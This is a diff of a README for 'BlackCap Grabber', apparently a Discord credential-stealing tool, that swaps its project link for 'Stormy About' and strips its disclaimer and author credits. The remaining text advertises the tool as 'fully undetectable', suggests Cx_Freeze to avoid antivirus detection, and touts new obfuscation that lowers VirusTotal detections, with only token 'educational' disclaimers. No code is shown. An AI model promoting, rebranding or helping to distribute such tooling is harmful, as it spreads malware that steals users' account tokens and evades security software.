@@ -4,21 +4,9 @@
 ##### BlackCap Codes is fully undetectable, the only detections are the fault of pyinstaller we recommend to use Cx_Freeze to compile it
 
 <h1 align="center">
- https://blackcap.glitch.me
+ Stormy About
 </h1>
 
-
-<h2 align="center">
-  BlackCap Grabber was made with
-
-Love ❌ code ✅
-
-</h2>
-
-`
-Blackcap was created for purely cultural and educational purposes in order to prove that the security of Discord and 
-other applications is totally to be reviewed. I do not encourage the use of this script on others. 
-That's why I won't be responsible for any damage caused by this script if you use it in violation of my terms of service.`
 
 **NOTE:** 
 - BlackCap was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
@@ -218,13 +206,6 @@ v2.3.9.5 2023-31-01
 + NEW OBFUSCATION OP (-6 detection on virustotal)
 ```
 
-
-### Authors
-- [@KSCH](https://github.com/KSCHdsc)
-- [@HisSlot](https://github.com/HisSlot)
-- [@Sans](https://github.com/002-sans)
-- [@loTus](https://github.com/loTus04)
-
 ### Contributors (CapingTeam)
 - Xenis
 - Nono1337
@@ -244,7 +225,3 @@ v2.3.9.5 2023-31-01
 - [x] Reselling is forbidden
 - [x] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
 - [x] We are NOT responsible of anything you do with our software (if its illegal)
-
-
-<a href=#top>Back to Top</a></p>
-![](https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/mona-loading-dark.gif)
